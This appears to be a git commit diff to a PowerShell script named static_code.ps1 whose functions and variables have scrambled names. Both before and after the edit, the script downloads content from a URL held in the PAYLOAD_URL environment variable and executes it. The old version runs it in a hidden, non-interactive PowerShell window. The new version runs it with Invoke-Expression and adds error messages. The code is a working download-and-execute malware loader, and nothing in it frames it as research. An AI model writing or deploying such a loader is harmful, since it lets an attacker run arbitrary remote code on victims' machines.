550ae5ab1e7704d0c938d3ed18ee575f8fb2ecc1
Naveen kumar <134396866+N4V33NM@users.noreply.github.com>
2025-02-25 19:47:52 +0530

    Update static_code.ps1

--- static_code.ps1
+++ static_code.ps1
@@ -4,40 +4,39 @@ function XhYjVwJtKz {
     )
 
     try {
-        $FfGgHhIiJj = Invoke-WebRequest -Uri $AaBbCcDdEe -TimeoutSec 10
+        $FfGgHhIiJj = Invoke-WebRequest -Uri $AaBbCcDdEe -UseBasicParsing -TimeoutSec 10
         return $FfGgHhIiJj.Content
     }
     catch {
+        Write-Host "Error: Failed to fetch data from URL - $AaBbCcDdEe"
         return $null
     }
 }
 
 function XoRpQkZtLs {
     param (
-        [string]$PpQqRrSsTt
+        [string]$scriptContent
     )
 
     try {
-        $UuVvWwXxYy = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($PpQqRrSsTt))
-        powershell.exe -NoP -NonI -W Hidden -Command $UuVvWwXxYy
+        Invoke-Expression $scriptContent  
     }
     catch {
+        Write-Host "Error: Failed to execute PowerShell command."
     }
 }
+
 
 $QwErTyUuOo = $env:PAYLOAD_URL  
 
-$VvWwXxYyZz = XhYjVwJtKz -AaBbCcDdEe $QwErTyUuOo
+if ($QwErTyUuOo) {
+    $VvWwXxYyZz = XhYjVwJtKz -AaBbCcDdEe $QwErTyUuOo
 
-if ($VvWwXxYyZz) {
-    $ZzYyXxWwVv = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($VvWwXxYyZz))
-    XoRpQkZtLs -PpQqRrSsTt $ZzYyXxWwVv
+    if ($VvWwXxYyZz) {
+        XoRpQkZtLs -scriptContent $VvWwXxYyZz
+    } else {
+        Write-Host "Error: No valid data received from the URL."
+    }
+} else {
+    Write-Host "Error: PAYLOAD_URL is not set."
 }
-
-
-
-
-
-
-
-
